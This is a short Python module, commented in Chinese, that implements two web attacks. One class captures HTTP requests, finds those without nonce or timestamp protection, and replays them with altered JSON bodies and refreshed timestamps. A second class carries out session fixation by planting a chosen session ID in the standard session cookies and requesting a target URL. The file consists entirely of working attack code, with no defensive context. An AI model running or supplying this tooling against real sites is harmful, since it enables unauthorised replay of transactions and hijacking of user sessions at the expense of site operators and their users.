#!/usr/bin/env python3
"""重放攻击"""
import time
import hashlib
import json
from typing import Dict, List
from collections import deque

class ReplayAttack:
    """重放攻击"""

    def __init__(self):
        self.captured_requests: deque = deque(maxlen=1000)
        self.nonce_cache: set = set()

    def capture_request(self, method: str, url: str, headers: Dict, body: str):
        """捕获请求"""
        self.captured_requests.append({
            "timestamp": time.time(),
            "method": method,
            "url": url,
            "headers": headers,
            "body": body,
            "hash": hashlib.sha256(f"{method}{url}{body}".encode()).hexdigest()
        })

    def replay_request(self, index: int = -1, modify: Dict = None) -> Dict:
        """重放请求"""
        if not self.captured_requests:
            return {"error": "No captured requests"}

        req = self.captured_requests[index]
        import requests

        headers = req["headers"].copy()
        body = req["body"]

        if modify:
            if isinstance(body, str):
                try:
                    data = json.loads(body)
                    data.update(modify)
                    body = json.dumps(data)
                except:
                    pass

        if "timestamp" in body or "Timestamp" in str(headers):
            body = body.replace(str(int(req["timestamp"])), str(int(time.time())))

        response = requests.request(req["method"], req["url"], headers=headers, data=body, timeout=10)

        return {
            "status": response.status_code,
            "response": response.text[:1000],
            "headers": dict(response.headers)
        }

    def find_replayable(self) -> List[Dict]:
        """查找可重放的请求"""
        replayable = []
        for req in self.captured_requests:
            body = req["body"]
            if "nonce" not in body.lower() and "timestamp" not in body.lower():
                replayable.append(req)
        return replayable

class SessionFixation:
    """会话固定攻击"""

    @staticmethod
    def fixate_session(session_id: str, target_url: str):
        """固定会话"""
        import requests
        session = requests.Session()
        session.cookies.set("sessionid", session_id)
        session.cookies.set("JSESSIONID", session_id)
        session.cookies.set("PHPSESSID", session_id)
        return session.get(target_url, timeout=10)
